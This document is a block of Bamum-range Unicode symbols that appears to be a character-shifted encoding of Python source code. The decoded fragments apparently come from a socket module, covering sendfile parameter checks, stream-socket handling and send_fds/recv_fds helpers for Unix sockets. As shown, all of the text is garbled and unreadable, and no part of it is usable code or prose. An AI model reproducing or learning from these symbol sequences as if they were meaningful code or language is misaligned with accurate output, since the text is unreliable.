ꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛭ꛽꛰ꛬ꛶ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛿꛺꛿ꛬ꛷ꛪ꛾꛰꛹꛿ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛴꛹ꛬ꛷꛷꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛿꛺꛿ꛬ꛷ꛪ꛾꛰꛹꛿ꚫꛉꚫꚻꚫꛬ꛹ꛯꚫ꛳ꛬ꛾ꛬ꛿꛿꛽ꚳ꛱꛴꛷꛰ꚷꚫꚲ꛾꛰꛰꛶ꚲꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛴꛷꛰ꚹ꛾꛰꛰꛶ꚳ꛺꛱꛱꛾꛰꛿ꚫꚶꚫ꛿꛺꛿ꛬ꛷ꛪ꛾꛰꛹꛿ꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪꛮ꛳꛰ꛮ꛶ꛪ꛾꛰꛹ꛯ꛱꛴꛷꛰ꛪ꛻ꛬ꛽ꛬ꛸꛾ꚳ꛾꛰꛷꛱ꚷꚫ꛱꛴꛷꛰ꚷꚫ꛺꛱꛱꛾꛰꛿ꚷꚫꛮ꛺꜀꛹꛿ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꚲꛭꚲꚫ꛹꛺꛿ꚫ꛴꛹ꚫ꛲꛰꛿ꛬ꛿꛿꛽ꚳ꛱꛴꛷꛰ꚷꚫꚲ꛸꛺ꛯ꛰ꚲꚷꚫꚲꛭꚲꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭ꛱꛴꛷꛰ꚫ꛾꛳꛺꜀꛷ꛯꚫꛭ꛰ꚫ꛺꛻꛰꛹꛰ꛯꚫ꛴꛹ꚫꛭ꛴꛹ꛬ꛽꜄ꚫ꛸꛺ꛯ꛰ꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫ꛾꛰꛷꛱ꚹ꛿꜄꛻꛰ꚫꚱꚫꛞꛚꛎꛖꛪꛞꛟꛝꛐꛌꛘꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭ꛺꛹꛷꜄ꚫꛞꛚꛎꛖꛪꛞꛟꛝꛐꛌꛘꚫ꛿꜄꛻꛰ꚫ꛾꛺ꛮ꛶꛰꛿꛾ꚫꛬ꛽꛰ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛮ꛺꜀꛹꛿ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫ꛴꛾꛴꛹꛾꛿ꛬ꛹ꛮ꛰ꚳꛮ꛺꜀꛹꛿ꚷꚫ꛴꛹꛿ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛟ꜄꛻꛰ꛐ꛽꛽꛺꛽ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭꛮ꛺꜀꛹꛿ꚫ꛸꜀꛾꛿ꚫꛭ꛰ꚫꛬꚫ꛻꛺꛾꛴꛿꛴꜁꛰ꚫ꛴꛹꛿꛰꛲꛰꛽ꚫꚳ꛲꛺꛿ꚫ꜆ꚬ꛽꜈ꚴꚭꚹ꛱꛺꛽꛸ꛬ꛿ꚳꛮ꛺꜀꛹꛿ꚴꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛮ꛺꜀꛹꛿ꚫꛇꛈꚫꚻꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭꛮ꛺꜀꛹꛿ꚫ꛸꜀꛾꛿ꚫꛭ꛰ꚫꛬꚫ꛻꛺꛾꛴꛿꛴꜁꛰ꚫ꛴꛹꛿꛰꛲꛰꛽ꚫꚳ꛲꛺꛿ꚫ꜆ꚬ꛽꜈ꚴꚭꚹ꛱꛺꛽꛸ꛬ꛿ꚳꛮ꛺꜀꛹꛿ꚴꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛹ꛯ꛱꛴꛷꛰ꚳ꛾꛰꛷꛱ꚷꚫ꛱꛴꛷꛰ꚷꚫ꛺꛱꛱꛾꛰꛿ꛈꚻꚷꚫꛮ꛺꜀꛹꛿ꛈꛙ꛺꛹꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭ꛾꛰꛹ꛯ꛱꛴꛷꛰ꚳ꛱꛴꛷꛰ꛦꚷꚫ꛺꛱꛱꛾꛰꛿ꛦꚷꚫꛮ꛺꜀꛹꛿ꛨꛨꚴꚫꚸꛉꚫ꛾꛰꛹꛿ꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛞ꛰꛹ꛯꚫꛬꚫ꛱꛴꛷꛰ꚫ꜀꛹꛿꛴꛷ꚫꛐꛚꛑꚫ꛴꛾ꚫ꛽꛰ꛬꛮ꛳꛰ꛯꚫꛭ꜄ꚫ꜀꛾꛴꛹꛲ꚫ꛳꛴꛲꛳ꚸ꛻꛰꛽꛱꛺꛽꛸ꛬ꛹ꛮ꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛺꛾ꚹ꛾꛰꛹ꛯ꛱꛴꛷꛰ꚳꚴꚫꛬ꛹ꛯꚫ꛽꛰꛿꜀꛽꛹ꚫ꛿꛳꛰ꚫ꛿꛺꛿ꛬ꛷ꚫ꛹꜀꛸ꛭ꛰꛽ꚫ꛺꛱ꚫꛭ꜄꛿꛰꛾ꚫ꜂꛳꛴ꛮ꛳ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꜂꛰꛽꛰ꚫ꛾꛰꛹꛿ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚵ꛱꛴꛷꛰ꚵꚫ꛸꜀꛾꛿ꚫꛭ꛰ꚫꛬꚫ꛽꛰꛲꜀꛷ꛬ꛽ꚫ꛱꛴꛷꛰ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫ꛺꛻꛰꛹꛰ꛯꚫ꛴꛹ꚫꛭ꛴꛹ꛬ꛽꜄ꚫ꛸꛺ꛯ꛰ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꛔ꛱ꚫ꛺꛾ꚹ꛾꛰꛹ꛯ꛱꛴꛷꛰ꚳꚴꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛬ꜁ꛬ꛴꛷ꛬꛭ꛷꛰ꚫꚳ꛰ꚹ꛲ꚹꚫꛢ꛴꛹ꛯ꛺꜂꛾ꚴꚫ꛺꛽ꚫ꛱꛴꛷꛰ꚫ꛴꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛹꛺꛿ꚫꛬꚫ꛽꛰꛲꜀꛷ꛬ꛽ꚫ꛱꛴꛷꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚹ꛾꛰꛹ꛯꚳꚴꚫ꜂꛴꛷꛷ꚫꛭ꛰ꚫ꜀꛾꛰ꛯꚫ꛴꛹꛾꛿꛰ꛬꛯꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚵ꛺꛱꛱꛾꛰꛿ꚵꚫ꛿꛰꛷꛷꛾ꚫ꛱꛽꛺꛸ꚫ꜂꛳꛰꛽꛰ꚫ꛿꛺ꚫ꛾꛿ꛬ꛽꛿ꚫ꛽꛰ꛬꛯ꛴꛹꛲ꚫ꛿꛳꛰ꚫ꛱꛴꛷꛰ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꛔ꛱ꚫ꛾꛻꛰ꛮ꛴꛱꛴꛰ꛯꚷꚫꚵꛮ꛺꜀꛹꛿ꚵꚫ꛴꛾ꚫ꛿꛳꛰ꚫ꛿꛺꛿ꛬ꛷ꚫ꛹꜀꛸ꛭ꛰꛽ꚫ꛺꛱ꚫꛭ꜄꛿꛰꛾ꚫ꛿꛺ꚫ꛿꛽ꛬ꛹꛾꛸꛴꛿ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛬ꛾ꚫ꛺꛻꛻꛺꛾꛰ꛯꚫ꛿꛺ꚫ꛾꛰꛹ꛯ꛴꛹꛲ꚫ꛿꛳꛰ꚫ꛱꛴꛷꛰ꚫ꜀꛹꛿꛴꛷ꚫꛐꛚꛑꚫ꛴꛾ꚫ꛽꛰ꛬꛮ꛳꛰ꛯꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꛑ꛴꛷꛰ꚫ꛻꛺꛾꛴꛿꛴꛺꛹ꚫ꛴꛾ꚫ꜀꛻ꛯꛬ꛿꛰ꛯꚫ꛺꛹ꚫ꛽꛰꛿꜀꛽꛹ꚫ꛺꛽ꚫꛬ꛷꛾꛺ꚫ꛴꛹ꚫꛮꛬ꛾꛰ꚫ꛺꛱ꚫ꛰꛽꛽꛺꛽ꚫ꛴꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꜂꛳꛴ꛮ꛳ꚫꛮꛬ꛾꛰ꚫ꛱꛴꛷꛰ꚹ꛿꛰꛷꛷ꚳꚴꚫꛮꛬ꛹ꚫꛭ꛰ꚫ꜀꛾꛰ꛯꚫ꛿꛺ꚫ꛱꛴꛲꜀꛽꛰ꚫ꛺꜀꛿ꚫ꛿꛳꛰ꚫ꛹꜀꛸ꛭ꛰꛽ꚫ꛺꛱ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛭ꜄꛿꛰꛾ꚫ꜂꛳꛴ꛮ꛳ꚫ꜂꛰꛽꛰ꚫ꛾꛰꛹꛿ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꛟ꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛸꜀꛾꛿ꚫꛭ꛰ꚫ꛺꛱ꚫꛞꛚꛎꛖꛪꛞꛟꛝꛐꛌꛘꚫ꛿꜄꛻꛰ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꛙ꛺꛹ꚸꛭ꛷꛺ꛮ꛶꛴꛹꛲ꚫ꛾꛺ꛮ꛶꛰꛿꛾ꚫꛬ꛽꛰ꚫ꛹꛺꛿ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛰꛹ꛯ꛱꛴꛷꛰ꛪ꜀꛾꛰ꛪ꛾꛰꛹ꛯ꛱꛴꛷꛰ꚳ꛱꛴꛷꛰ꚷꚫ꛺꛱꛱꛾꛰꛿ꚷꚫꛮ꛺꜀꛹꛿ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꛪꛒ꛴꜁꛰꜀꛻ꛚ꛹ꛞ꛰꛹ꛯ꛱꛴꛷꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛰꛹ꛯ꛱꛴꛷꛰ꛪ꜀꛾꛰ꛪ꛾꛰꛹ꛯꚳ꛱꛴꛷꛰ꚷꚫ꛺꛱꛱꛾꛰꛿ꚷꚫꛮ꛺꜀꛹꛿ꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪꛯ꛰ꛮ꛽꛰꛱ꛪ꛾꛺ꛮ꛶꛰꛿꛴꛺꛾ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛴꛺ꛪ꛽꛰꛱꛾ꚫꛉꚫꚻꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛴꛺ꛪ꛽꛰꛱꛾ꚫꚸꛈꚫꚼꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪꛮ꛷꛺꛾꛰ꛯꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛮ꛷꛺꛾꛰ꚳꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪ꛽꛰ꛬ꛷ꛪꛮ꛷꛺꛾꛰ꚳ꛾꛰꛷꛱ꚷꚫꛪ꛾꛾ꛈꛪ꛾꛺ꛮ꛶꛰꛿ꚹ꛾꛺ꛮ꛶꛰꛿ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛟ꛳꛴꛾ꚫ꛱꜀꛹ꛮ꛿꛴꛺꛹ꚫ꛾꛳꛺꜀꛷ꛯꚫ꛹꛺꛿ꚫ꛽꛰꛱꛰꛽꛰꛹ꛮ꛰ꚫꛬ꛹꜄ꚫ꛲꛷꛺ꛭꛬ꛷꛾ꚹꚫꛞ꛰꛰ꚫ꛴꛾꛾꜀꛰ꚫꚮꛃꚻꛃꚼꛁꚿꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꛪ꛾꛾ꚹꛮ꛷꛺꛾꛰ꚳ꛾꛰꛷꛱ꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛮ꛷꛺꛾꛰ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛟ꛳꛴꛾ꚫ꛱꜀꛹ꛮ꛿꛴꛺꛹ꚫ꛾꛳꛺꜀꛷ꛯꚫ꛹꛺꛿ꚫ꛽꛰꛱꛰꛽꛰꛹ꛮ꛰ꚫꛬ꛹꜄ꚫ꛲꛷꛺ꛭꛬ꛷꛾ꚹꚫꛞ꛰꛰ꚫ꛴꛾꛾꜀꛰ꚫꚮꛃꚻꛃꚼꛁꚿꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛷꛺꛾꛰ꛯꚫꛈꚫꛟ꛽꜀꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛴꛺ꛪ꛽꛰꛱꛾ꚫꛇꛈꚫꚻꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛽꛰ꛬ꛷ꛪꛮ꛷꛺꛾꛰ꚳꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛯ꛰꛿ꛬꛮ꛳ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛯ꛰꛿ꛬꛮ꛳ꚳꚴꚫꚸꛉꚫ꛱꛴꛷꛰ꚫꛯ꛰꛾ꛮ꛽꛴꛻꛿꛺꛽ꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛎ꛷꛺꛾꛰ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫ꜂꛴꛿꛳꛺꜀꛿ꚫꛮ꛷꛺꛾꛴꛹꛲ꚫ꛿꛳꛰ꚫ꜀꛹ꛯ꛰꛽꛷꜄꛴꛹꛲ꚫ꛱꛴꛷꛰ꚫꛯ꛰꛾ꛮ꛽꛴꛻꛿꛺꛽ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꛟ꛳꛰ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫꛮꛬ꛹꛹꛺꛿ꚫꛭ꛰ꚫ꜀꛾꛰ꛯꚫꛬ꛱꛿꛰꛽ꚫ꛿꛳꛴꛾ꚫꛮꛬ꛷꛷ꚷꚫꛭ꜀꛿ꚫ꛿꛳꛰ꚫ꛱꛴꛷꛰ꚫꛯ꛰꛾ꛮ꛽꛴꛻꛿꛺꛽ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮꛬ꛹ꚫꛭ꛰ꚫ꛽꛰꜀꛾꛰ꛯꚫ꛱꛺꛽ꚫ꛺꛿꛳꛰꛽ꚫ꛻꜀꛽꛻꛺꛾꛰꛾ꚹꚫꚫꛟ꛳꛰ꚫ꛱꛴꛷꛰ꚫꛯ꛰꛾ꛮ꛽꛴꛻꛿꛺꛽ꚫ꛴꛾ꚫ꛽꛰꛿꜀꛽꛹꛰ꛯꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛷꛺꛾꛰ꛯꚫꛈꚫꛟ꛽꜀꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꜀꛻꛰꛽ꚳꚴꚹꛯ꛰꛿ꛬꛮ꛳ꚳꚴꚕꚕꚫꚫꚫꚫꛋ꛻꛽꛺꛻꛰꛽꛿꜄ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛱ꛬ꛸꛴꛷꜄ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛝ꛰ꛬꛯꚸ꛺꛹꛷꜄ꚫꛬꛮꛮ꛰꛾꛾ꚫ꛿꛺ꚫ꛿꛳꛰ꚫꛬꛯꛯ꛽꛰꛾꛾ꚫ꛱ꛬ꛸꛴꛷꜄ꚫ꛱꛺꛽ꚫ꛿꛳꛴꛾ꚫ꛾꛺ꛮ꛶꛰꛿ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛪ꛴꛹꛿꛰꛹꜀꛸ꛪꛮ꛺꛹꜁꛰꛽꛿꛰꛽ꚳ꛾꜀꛻꛰꛽ꚳꚴꚹ꛱ꛬ꛸꛴꛷꜄ꚷꚫꛌꛯꛯ꛽꛰꛾꛾ꛑꛬ꛸꛴꛷꜄ꚴꚕꚕꚫꚫꚫꚫꛋ꛻꛽꛺꛻꛰꛽꛿꜄ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛿꜄꛻꛰ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛝ꛰ꛬꛯꚸ꛺꛹꛷꜄ꚫꛬꛮꛮ꛰꛾꛾ꚫ꛿꛺ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛿꜄꛻꛰ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛪ꛴꛹꛿꛰꛹꜀꛸ꛪꛮ꛺꛹꜁꛰꛽꛿꛰꛽ꚳ꛾꜀꛻꛰꛽ꚳꚴꚹ꛿꜄꛻꛰ꚷꚫꛞ꛺ꛮ꛶꛰꛿ꛖ꛴꛹ꛯꚴꚕꚕꚫꚫꚫꚫ꛴꛱ꚫ꛺꛾ꚹ꛹ꛬ꛸꛰ꚫꛈꛈꚫꚲ꛹꛿ꚲꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛰꛱ꚫ꛲꛰꛿ꛪ꛴꛹꛳꛰꛽꛴꛿ꛬꛭ꛷꛰ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛺꛾ꚹ꛲꛰꛿ꛪ꛳ꛬ꛹ꛯ꛷꛰ꛪ꛴꛹꛳꛰꛽꛴꛿ꛬꛭ꛷꛰ꚳ꛾꛰꛷꛱ꚹ꛱꛴꛷꛰꛹꛺ꚳꚴꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛿ꛪ꛴꛹꛳꛰꛽꛴꛿ꛬꛭ꛷꛰ꚳ꛾꛰꛷꛱ꚷꚫ꛴꛹꛳꛰꛽꛴꛿ꛬꛭ꛷꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛺꛾ꚹ꛾꛰꛿ꛪ꛳ꛬ꛹ꛯ꛷꛰ꛪ꛴꛹꛳꛰꛽꛴꛿ꛬꛭ꛷꛰ꚳ꛾꛰꛷꛱ꚹ꛱꛴꛷꛰꛹꛺ꚳꚴꚷꚫ꛴꛹꛳꛰꛽꛴꛿ꛬꛭ꛷꛰ꚴꚕꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛰꛱ꚫ꛲꛰꛿ꛪ꛴꛹꛳꛰꛽꛴꛿ꛬꛭ꛷꛰ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛺꛾ꚹ꛲꛰꛿ꛪ꛴꛹꛳꛰꛽꛴꛿ꛬꛭ꛷꛰ꚳ꛾꛰꛷꛱ꚹ꛱꛴꛷꛰꛹꛺ꚳꚴꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛿ꛪ꛴꛹꛳꛰꛽꛴꛿ꛬꛭ꛷꛰ꚳ꛾꛰꛷꛱ꚷꚫ꛴꛹꛳꛰꛽꛴꛿ꛬꛭ꛷꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛺꛾ꚹ꛾꛰꛿ꛪ꛴꛹꛳꛰꛽꛴꛿ꛬꛭ꛷꛰ꚳ꛾꛰꛷꛱ꚹ꛱꛴꛷꛰꛹꛺ꚳꚴꚷꚫ꛴꛹꛳꛰꛽꛴꛿ꛬꛭ꛷꛰ꚴꚕꚫꚫꚫꚫ꛲꛰꛿ꛪ꛴꛹꛳꛰꛽꛴꛿ꛬꛭ꛷꛰ꚹꛪꛪꛯ꛺ꛮꛪꛪꚫꛈꚫꚭꛒ꛰꛿ꚫ꛿꛳꛰ꚫ꛴꛹꛳꛰꛽꛴꛿ꛬꛭ꛷꛰ꚫ꛱꛷ꛬ꛲ꚫ꛺꛱ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚭꚕꚫꚫꚫꚫ꛾꛰꛿ꛪ꛴꛹꛳꛰꛽꛴꛿ꛬꛭ꛷꛰ꚹꛪꛪꛯ꛺ꛮꛪꛪꚫꛈꚫꚭꛞ꛰꛿ꚫ꛿꛳꛰ꚫ꛴꛹꛳꛰꛽꛴꛿ꛬꛭ꛷꛰ꚫ꛱꛷ꛬ꛲ꚫ꛺꛱ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚭꚕꚕꛯ꛰꛱ꚫ꛱꛽꛺꛸꛱ꛯꚳ꛱ꛯꚷꚫ꛱ꛬ꛸꛴꛷꜄ꚷꚫ꛿꜄꛻꛰ꚷꚫ꛻꛽꛺꛿꛺ꛈꚻꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꚫ꛱꛽꛺꛸꛱ꛯꚳ꛱ꛯꚷꚫ꛱ꛬ꛸꛴꛷꜄ꚷꚫ꛿꜄꛻꛰ꛦꚷꚫ꛻꛽꛺꛿꛺ꛨꚴꚫꚸꛉꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚕꚕꚫꚫꚫꚫꛎ꛽꛰ꛬ꛿꛰ꚫꛬꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫ꛱꛽꛺꛸ꚫꛬꚫꛯ꜀꛻꛷꛴ꛮꛬ꛿꛰ꚫ꛺꛱ꚫ꛿꛳꛰ꚫ꛲꛴꜁꛰꛹ꚫ꛱꛴꛷꛰ꚕꚫꚫꚫꚫꛯ꛰꛾ꛮ꛽꛴꛻꛿꛺꛽ꚹꚫꚫꛟ꛳꛰ꚫ꛽꛰꛸ꛬ꛴꛹꛴꛹꛲ꚫꛬ꛽꛲꜀꛸꛰꛹꛿꛾ꚫꛬ꛽꛰ꚫ꛿꛳꛰ꚫ꛾ꛬ꛸꛰ꚫꛬ꛾ꚫ꛱꛺꛽ꚫ꛾꛺ꛮ꛶꛰꛿ꚳꚴꚹꚕꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫ꛹꛱ꛯꚫꛈꚫꛯ꜀꛻ꚳ꛱ꛯꚴꚕꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛺ꛮ꛶꛰꛿ꚳ꛱ꛬ꛸꛴꛷꜄ꚷꚫ꛿꜄꛻꛰ꚷꚫ꛻꛽꛺꛿꛺ꚷꚫ꛹꛱ꛯꚴꚕꚕ꛴꛱ꚫ꛳ꛬ꛾ꛬ꛿꛿꛽ꚳꛪ꛾꛺ꛮ꛶꛰꛿ꚹ꛾꛺ꛮ꛶꛰꛿ꚷꚫꚭ꛾꛰꛹ꛯ꛸꛾꛲ꚭꚴꛅꚕꚫꚫꚫꚫ꛴꛸꛻꛺꛽꛿ꚫꛬ꛽꛽ꛬ꜄ꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛹ꛯꛪ꛱ꛯ꛾ꚳ꛾꛺ꛮ꛶ꚷꚫꛭ꜀꛱꛱꛰꛽꛾ꚷꚫ꛱ꛯ꛾ꚷꚫ꛱꛷ꛬ꛲꛾ꛈꚻꚷꚫꛬꛯꛯ꛽꛰꛾꛾ꛈꛙ꛺꛹꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚫ꛾꛰꛹ꛯꛪ꛱ꛯ꛾ꚳ꛾꛺ꛮ꛶ꚷꚫꛭ꜀꛱꛱꛰꛽꛾ꚷꚫ꛱ꛯ꛾ꛦꚷꚫ꛱꛷ꛬ꛲꛾ꛦꚷꚫꛬꛯꛯ꛽꛰꛾꛾ꛨꛨꚴꚫꚸꛉꚫ꛴꛹꛿꛰꛲꛰꛽ꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛞ꛰꛹ꛯꚫ꛿꛳꛰ꚫ꛷꛴꛾꛿ꚫ꛺꛱ꚫ꛱꛴꛷꛰ꚫꛯ꛰꛾ꛮ꛽꛴꛻꛿꛺꛽꛾ꚫ꛱ꛯ꛾ꚫ꛺꜁꛰꛽ꚫꛬ꛹ꚫꛌꛑꛪꛠꛙꛔꛣꚫ꛾꛺ꛮ꛶꛰꛿ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛺ꛮ꛶ꚹ꛾꛰꛹ꛯ꛸꛾꛲ꚳꛭ꜀꛱꛱꛰꛽꛾ꚷꚫꛦꚳꛪ꛾꛺ꛮ꛶꛰꛿ꚹꛞꛚꛗꛪꛞꛚꛎꛖꛐꛟꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛪ꛾꛺ꛮ꛶꛰꛿ꚹꛞꛎꛘꛪꛝꛔꛒꛓꛟꛞꚷꚫꛬ꛽꛽ꛬ꜄ꚹꛬ꛽꛽ꛬ꜄ꚳꚭ꛴ꚭꚷꚫ꛱ꛯ꛾ꚴꚴꛨꚴꚕꚫꚫꚫꚫꛪꛪꛬ꛷꛷ꛪꛪꚹꛬ꛻꛻꛰꛹ꛯꚳꚭ꛾꛰꛹ꛯꛪ꛱ꛯ꛾ꚭꚴꚕꚕ꛴꛱ꚫ꛳ꛬ꛾ꛬ꛿꛿꛽ꚳꛪ꛾꛺ꛮ꛶꛰꛿ꚹ꛾꛺ꛮ꛶꛰꛿ꚷꚫꚭ꛽꛰ꛮ꜁꛸꛾꛲ꚭꚴꛅꚕꚫꚫꚫꚫ꛴꛸꛻꛺꛽꛿ꚫꛬ꛽꛽ꛬ꜄ꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛽꛰ꛮ꜁ꛪ꛱ꛯ꛾ꚳ꛾꛺ꛮ꛶ꚷꚫꛭ꜀꛱꛾꛴꜅꛰ꚷꚫ꛸ꛬ꜃꛱ꛯ꛾ꚷꚫ꛱꛷ꛬ꛲꛾ꛈꚻꚴꛅꚕꚫꚫꚫ